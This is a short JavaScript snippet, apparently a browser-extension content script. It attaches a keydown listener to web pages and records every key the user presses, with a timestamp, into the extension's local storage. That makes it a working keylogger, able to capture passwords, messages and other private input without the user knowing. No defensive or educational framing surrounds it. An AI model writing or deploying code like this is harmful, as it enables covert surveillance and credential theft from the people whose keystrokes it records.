console.log("✅C:");

document.addEventListener("keydown", function (event) {
    console.log("📝:", event.key);

    chrome.storage.local.get({ logs: [] }, function (data) {
        let logs = data.logs;
        logs.push({
            type: "KeyPress",
            value: event.key,
            timestamp: new Date().toISOString()
        });

        chrome.storage.local.set({ logs: logs }, function () {
            console.log("✔️ Key logged:", event.key);
        });
    });
});
